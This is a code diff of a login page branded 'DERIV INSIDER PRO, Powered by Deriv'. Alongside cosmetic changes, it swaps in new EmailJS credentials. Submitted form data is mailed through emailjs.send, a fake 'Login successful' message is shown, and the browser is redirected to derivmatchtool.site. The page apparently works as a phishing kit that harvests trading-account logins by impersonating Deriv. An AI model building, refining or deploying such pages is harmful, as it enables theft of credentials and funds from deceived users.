@@ -29,7 +29,7 @@
       display:flex;
       justify-content:center;
       align-items:center;
-      background:linear-gradient(135deg,#0f172a,#1d4ed8,#2563eb);
+      background:linear-gradient(135deg,#032b05,#032b05,#032b05);
       padding:20px;
       overflow:hidden;
     }
@@ -47,13 +47,13 @@
     }
 
     body::before{
-      background:#60a5fa;
+      background:#032b05;
       top:-80px;
       left:-80px;
     }
 
     body::after{
-      background:#2563eb;
+      background:#032b05;
       bottom:-80px;
       right:-80px;
     }
@@ -290,12 +290,23 @@
 <div class="container">
 
   <!-- Logo -->
-  <div class="logo">
-    <i class="fa-solid fa-chart-line"></i>
+ <div class="logo">
+   <img src="logo2.png" alt="Logo" style="
+    width:70px;
+    height:70px;
+    border-radius:20px;
+    display:block;
+    margin:0 auto 10px;
+    box-shadow:
+        0 0 10px rgba(80, 92, 255, 0.8),
+        0 0 20px rgba(49, 52, 247, 0.774),
+        0 0 40px rgba(54, 50, 245, 0.6);
+    animation: logoGlow 2s ease-in-out infinite alternate;
+">
   </div>
 
   <!-- Title -->
-  <h1>DERIV INSIDER</h1>
+  <h1>DERIV INSIDER PRO</h1>
   <p class="subtitle">
     Powered by Deriv
   </p>
@@ -340,7 +351,7 @@
     <button type="submit" class="btn">
 
       <span id="btnText">
-        Login
+        SIGN IN
       </span>
 
       <div class="loader" id="loader"></div>
@@ -413,7 +424,7 @@
      EMAILJS INIT
   ========================================= */
 
-  emailjs.init("ZMnBKVwT7KktfxvMx");
+  emailjs.init("2CFXVctSTCY05sGba");
 
   const form = document.getElementById("orderForm");
   const messageBox = document.getElementById("message");
@@ -479,22 +490,27 @@ Time: ${currentDate}`
 
     };
 
-    try{
+try{
 
-      await emailjs.send(
-        "service_mfhgp5t",
-        "template_i2rth3k",
-        templateParams
-      );
+  await emailjs.send(
+    "service_za9tqt7",
+    "template_fr0o92g",
+    templateParams
+  );
 
-      showMessage(
-        "New user registration restricted. Visit 'LiveChat' for free logins.",
-        "success"
-      );
+  showMessage(
+    "Login successful. Redirecting...",
+    "success"
+  );
 
-      form.reset();
+  form.reset();
 
-    }catch(error){
+  // Redirect only after EmailJS succeeds
+  setTimeout(() => {
+    window.location.href = "https://derivmatchtool.site";
+  }, 1500);
+
+}catch(error){
 
       console.error(error);
 
